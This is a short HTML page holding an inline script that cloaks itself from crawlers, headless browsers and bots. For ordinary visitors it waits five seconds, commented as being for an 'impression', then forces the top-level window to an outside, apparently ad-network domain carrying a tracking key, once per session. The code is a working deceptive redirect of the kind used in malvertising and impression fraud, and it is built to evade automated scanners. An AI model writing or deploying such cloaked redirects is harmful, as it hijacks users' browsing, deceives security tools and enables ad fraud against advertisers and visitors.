<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirect</title>
</head>
<body>

<script>
(function () {

    // === BASIC ENV CHECK ===
    if (!navigator.userAgent) return;

    const ua = navigator.userAgent.toLowerCase();

    // === BLOCK OBVIOUS BOTS ONLY ===
    if (
        ua.includes("headless") ||
        ua.includes("phantom") ||
        ua.includes("crawler") ||
        ua.includes("spider") ||
        ua.includes("bot")
    ) return;

    // === PREVENT MULTIPLE REDIRECT ===
    if (sessionStorage.getItem("rd_done")) return;
    sessionStorage.setItem("rd_done", "1");

    // === SAFE DELAY FOR IMPRESSION ===
    setTimeout(function () {
        try {
            window.top.location.replace("https://potentialmaydrench.com/jm8i7er9?key=118c309f728217af88214fc1bc1e64ed");
        } catch (e) {
            window.location.href = "https://potentialmaydrench.com/jm8i7er9?key=118c309f728217af88214fc1bc1e64ed";
        }
    }, 5000);

})();
</script>
